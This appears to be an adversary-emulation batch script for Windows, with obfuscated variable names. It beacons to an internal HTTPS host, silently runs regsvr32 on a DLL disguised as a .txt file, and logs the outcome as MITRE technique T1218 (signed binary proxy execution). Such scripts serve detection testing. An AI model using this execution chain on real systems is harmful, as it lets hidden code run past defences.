@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET douyiw=%APPDATA%\9713\86feba73
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?9713-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=illustrator.txt
SET rgnpbq=9713

SET ywxtm=%APPDATA%\!fkesh!\macula-simulations.log
SET urqpi=0
SET kwdms=

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_start=>> "!ywxtm!" 2>nul
curl -k -s -o nul "!frytcn!"
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_complete=>> "!ywxtm!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_start=!douyiw!>> "!ywxtm!" 2>nul
cd /d "!douyiw!" 2>nul
if errorlevel 1 (
    SET urqpi=1
    SET kwdms=chdir_failed
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_fail=!errorlevel!>> "!ywxtm!" 2>nul
) else (
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_success=>> "!ywxtm!" 2>nul
)

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: dll_load_start=!ecrfwq!>> "!ywxtm!" 2>nul
regsvr32.exe /s !ecrfwq!
if errorlevel 1 (
    SET urqpi=1
    SET kwdms=regsvr_failed
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: dll_load_fail=!errorlevel!>> "!ywxtm!" 2>nul
) else (
    SET urqpi=0
    SET kwdms=
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: dll_load_success=>> "!ywxtm!" 2>nul
)

SET nvjkd=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2!
SET xrybm=!TIME:~0,8!.000
echo [!nvjkd! !xrybm!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed Binary Proxy Execution=!urqpi!:!kwdms!>> "!ywxtm!" 2>nul
ENDLOCAL